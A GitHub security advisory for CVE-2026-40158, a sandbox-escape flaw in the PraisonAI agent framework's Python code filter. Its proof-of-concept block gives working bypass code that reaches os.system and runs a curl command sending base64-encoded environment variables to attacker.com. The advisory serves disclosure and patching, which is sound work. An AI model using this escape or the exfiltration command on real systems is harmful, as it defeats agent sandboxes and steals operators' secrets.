# [H] PraisonAI Vulnerable to Code Injection and Protection Mechanism Failure

## Summary
Severity: High
Advisory: GHSA-3c4r-6p77-xwr7
CVE: CVE-2026-40158
CWE: CWE-693, CWE-94
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-3c4r-6p77-xwr7
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
PraisonAI's AST-based Python sandbox can be bypassed using `type.__getattribute__` trampoline, allowing arbitrary code execution when running untrusted agent code.

## Description

The `_execute_code_direct` function in `praisonaiagents/tools/python_tools.py` uses AST filtering to block dangerous Python attributes like `__subclasses__`, `__globals__`, and `__bases__`. However, the filter only checks `ast.Attribute` nodes, allowing bypass via:

The sandbox relies on AST-based filtering of attribute access but fails to account for dynamic attribute resolution via built-in methods such as type.__getattribute__, resulting in incomplete enforcement of security restrictions.


```python
type.__getattribute__(obj, '__subclasses__')  # Bypasses filter
```

The string `'__subclasses__'` is an `ast.Constant`, not an `ast.Attribute`, so it is never checked against the blocked list.

## Proof of Concept

```python
# This code bypasses the sandbox and achieves RCE
t = type
int_cls = t(1)

# Bypass blocked __bases__ via type.__getattribute__
bases = t.__getattribute__(int_cls, '__bases__')
obj_cls = bases[0]

# Bypass blocked __subclasses__
subclasses_fn = t.__getattribute__(obj_cls, '__subclasses__')
all_subclasses = subclasses_fn()

# Find _wrap_close class
for c in all_subclasses:
    if t.__getattribute__(c, '__name__') == '_wrap_close':
        # Get __init__.__globals__ via bypass
        init = t.__getattribute__(c, '__init__')
        glb = type(init).__getattribute__(init, '__globals__')
        
        # Get system function and execute
        system = glb['system']
        system('curl https://attacker.com/steal --data "$(env | base64)"')
```

---

## Impact

This vulnerability allows attackers to escape the intended Python sandbox and execute arbitrary code with the privileges of the host process.

An attacker can:

* Access sensitive data such as environment variables, API keys, and local files
* Execute arbitrary system commands
* Modify or delete files on the system

In environments that execute untrusted code (e.g., multi-tenant agent platforms, CI/CD pipelines, or shared systems), this can lead to full system compromise, data exfiltration, and potential lateral movement within the infrastructure.

---

## Affected Code

```python
# praisonaiagents/tools/python_tools.py (approximate)
def _execute_code_direct(code, ...):
    tree = ast.parse(code)
    
    for node in ast.walk(tree):
        # Only checks ast.Attribute nodes
        if isinstance(node, ast.Attribute) and node.attr in blocked_attrs:
            raise SecurityError(...)
    
    # Bypass: string arguments are not checked
    exec(compiled, safe_globals)
```


**Reporter:** Lakshmikanthan K (letchupkt)

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-3c4r-6p77-xwr7
- https://nvd.nist.gov/vuln/detail/CVE-2026-40158
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
